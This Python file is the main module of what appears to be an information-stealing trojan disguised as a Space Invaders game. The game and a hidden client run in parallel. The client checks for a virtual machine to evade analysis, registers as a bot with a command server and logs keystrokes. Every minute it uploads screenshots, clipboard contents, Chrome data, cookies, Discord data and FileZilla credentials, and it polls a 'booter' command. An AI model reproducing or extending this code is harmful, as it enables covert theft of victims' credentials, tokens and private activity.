import time
import schedule
import multiprocessing

from pynput.keyboard import Key, Listener

from game.spaceinvaders import startGame

from modules.api import ApiController
from modules.file import FileController
from modules.b64 import b64
from modules.antiVM import AntiVM
from modules.booter import Booter
from modules.chrome import Chrome
from modules.cookies import Cookies
from modules.discord import Discord
from modules.filezilla import Filezilla
from modules.keylogger import KeyLogger

API_URL = "http://localhost:4000"
CONFIG_PATH = "config.txt"
BOOT_CONFIG_PATH = "boot.txt"
SCREENSHOT_PATH = "screenshot.jpg"
LOG_PATH = "logs.txt"

def startClient():
    if(AntiVM().inVM()):
        exit()
    else:
        api = ApiController(API_URL, BOOT_CONFIG_PATH, SCREENSHOT_PATH, LOG_PATH)
        fsc = FileController(CONFIG_PATH)

        if api.check_connection():
            if fsc.check_file(CONFIG_PATH):
                bot_data = fsc.get_creds()
            
                if bot_data and isinstance(bot_data, list):
                    try:
                        bot_identifier = b64().decrypt(bot_data[0])
                        bot_token = b64().decrypt(bot_data[1])
                    except:
                        os.remove(CONFIG_PATH)
                        bot_data = api.register_account()
                        fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                        main()
                    
                    if api.check_account(bot_identifier, bot_token):
                        logger = KeyLogger(LOG_PATH)
                        listener = Listener(on_press=logger.on_press)
                        listener.start()

                        schedule.every(1).minutes.do(lambda: Booter().boot(api.check_boot(bot_identifier, bot_token)))
                        schedule.every(1).minutes.do(lambda: api.update_details(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.update_screenshot(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.update_logs(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.check_clipboard(bot_identifier, bot_token))
                        schedule.every(1).minutes.do(lambda: api.update_chrome(bot_identifier, bot_token, Chrome().dump()))
                        schedule.every(1).minutes.do(lambda: api.update_cookies(bot_identifier, bot_token, Cookies().dump()))
                        schedule.every(1).minutes.do(lambda: api.update_discord(bot_identifier, bot_token, Discord().dump()))
                        schedule.every(1).minutes.do(lambda: api.update_filezilla(bot_identifier, bot_token, Filezilla().dump()))

                        while True:
                            schedule.run_pending()
                            time.sleep(1)
                    else:
                        os.remove(CONFIG_PATH)
                        bot_data = api.register_account()
                        fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                        main()

                else:
                    os.remove(CONFIG_PATH)
                    bot_data = api.register_account()
                    fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                    main()
            else:
                bot_data = api.register_account()
                fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                main()
        else:
            time.sleep(30)
            main()

def main():
    p1 = multiprocessing.Process(target=startClient)
    p2 = multiprocessing.Process(target=startGame)
  
    p1.start()
    p2.start()
  
    p1.join()
    p2.join()

if __name__ == "__main__":
    main()